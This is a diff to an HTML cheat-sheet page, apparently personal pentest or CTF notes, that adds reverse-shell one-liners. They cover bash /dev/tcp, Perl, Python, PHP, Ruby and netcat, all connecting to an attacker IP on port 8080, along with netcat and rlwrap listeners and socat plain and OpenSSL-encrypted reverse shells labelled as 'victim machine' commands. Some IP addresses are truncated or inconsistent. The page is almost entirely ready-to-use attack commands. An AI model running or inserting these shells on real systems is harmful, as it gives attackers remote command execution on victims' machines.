@@ -9,6 +9,32 @@
 </head>
 <body>
     <h1 style="text-align: center;">Shell</h1><br><br>
+
+    <div>
+        <p>The following examples assums the hacker IP is 10.20.14 and use port 8080 for the connection.<br>
+            in all f these cases you need to listen for port 8080 using the foolowing command: <b>nc -lvp 8080</b>
+        <br><br>
+        <b>BASH</b><br><br>
+        <code>bash -i >& /dev/tcp/10.20.14.203/8080 0>&1 </code><br><br>
+        <b>PERL</b><br><br>
+        <code>perl -e 'use Socket;$i="10.20.14";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'</code>
+        <br><br>
+        <b>Python</b><br><br>
+         <code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.20.14",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+         </code><br><br>
+        <b>PHP</b><br><br>
+        <code>php -r '$sock=fsockopen("10.20.14",8080);exec("/bin/sh -i <&3 >&3 2>&3");'</code>
+        <br><br>
+        <b>Ruby</b><br><br>
+        <code>ruby -rsocket -e'f=TCPSocket.open("10.20.14",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'</code>
+        <br><br>
+        <b>Netcat</b><br><br>
+        <code>nc -e /bin/sh 10.20.14 8080<br></code><br>
+        <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.61.193 8080 >/tmp/f</code><br>
+        <br>More Shell: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" target="_blank" rel="noopener noreferrer">Reverse Shell Cheat Sheet</a>
+            </p>
+    </div>
+<br><br>
     <div>
         <h3>Netcat Shell Stabilisation </h3>
             <div><u><i>Technique 1: Python<br></i></u>
@@ -19,15 +45,42 @@
             </ol></div>
 
             <div>
-                Technique 2: rlwrap
+                Technique 2: rlwrap<br><br>
 
-                rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with sudo apt install rlwrap.
+                <code> rlwrap</code> is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell;<br>
+                 however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali,<br>
+                  so first install it with sudo apt install rlwrap.
 
                 To use rlwrap, we invoke a slightly different listener:
 
                 <code>rlwrap nc -lvnp [port]</code>
 
             </div>
+<br><br>
+
+        <div>
+            <h3>Socat Shells</h3>
+            <h4>Reverse shell:</h4>
+            setup listener<br><br>
+            <code>socat TCP-L:[port] -</code><br><br>
+            Victim machine command<br><br>
+            <code>socat TCP:[LOCAL-IP]:[LOCAL-PORT] EXEC:powershell.exe,pipes</code> 
+            <br>or<br>
+            <code>socat TCP:[LOCAL-IP]:[LOCAL-PORT] EXEC:"bash -li"</code> or <br>
+            <code>socat TCP:[LOCAL-IP]:[LOCAL-PORT] EXEC:"bash -li",pty,stderr,sigint,setsid,sane</code>
+        </div>
+        
+        <div><br><br>
+            <h3>Socat Encrypted Shells</h3>
+            <h4>Make Reverse Shell:</h4>
+            1. <code>openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt</code><br>
+            2. <code>cat shell.key shell.crt > shell.pem</code><br>
+            3. <code>socat OPENSSL-LISTEN:[PORT],cert=shell.pem,verify=0 -</code><br><br>
+            <h4>Victim Machine cmd</h4>
+            <code>socat OPENSSL:[LOCAL-IP]:[LOCAL-PORT],verify=0 EXEC:/bin/bash</code><br>
+            or<br> <code>socat OPENSSL:[IP]:[PORT] EXEC:"bash -li",pty,stderr,sigint,setsid,sane</code>
+             
+        </div>
     </div>
 </body>
 </html>
